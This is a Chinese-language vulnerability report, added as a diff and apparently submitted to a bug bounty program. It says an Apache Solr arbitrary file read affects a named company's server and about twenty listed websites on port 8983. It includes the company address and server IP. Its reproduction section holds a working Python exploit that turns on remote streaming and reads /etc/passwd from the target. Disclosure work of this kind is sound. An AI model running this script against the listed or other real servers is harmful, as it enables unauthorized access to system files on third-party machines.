@@ -1,0 +1,41 @@
+厂商名称：深圳市爱站网络科技有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://www.tzfrmy.cn:8983 http://textile-flags.com:8983 http://www.fuqianji.com:8983 http://www.aizhan.com:8983 http://www.jswhty.com:8983 http://lovefiji.com:8983 http://www.xhjnmc.com:8983 http://www.jshdtyss.com:8983 http://www.ccssjx.com:8983 http://www.xinkouwei.com.cn:8983 http://www.aizhan.com:8983 http://yinxinhr.com:8983 http://www.xhxfzx.com:8983 http://www.xhcsyey.com:8983 http://www.lovefiji.com:8983 http://www.jshydq.com.cn:8983 http://ourily.cn:8983 http://www.dabutang.com.cn:8983 http://yaxfqc.com:8983 http://wxxgnc.com:8983
+网站名称：深圳市爱站网络科技有限公司
+网站ip：47.100.1.41
+所属地区：深圳市福田区梅林路卓越梅林中心广场(南区)B座1101A
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：一般经营项目是：网络技术开发；网络技术咨询（不含限制项目）；电子产品的技术开发与相关技术咨询；网络技术服务；软件开发。（除依法须经批准的项目外，凭营业执照依法自主开展经营活动），许可经营项目是：第二类增值电信业务。（依法须经批准的项目，经相关部门批准后方可开展经营活动，具体经营项目以相关部门批准文件或许可证件为准）
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://47.100.1.41:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
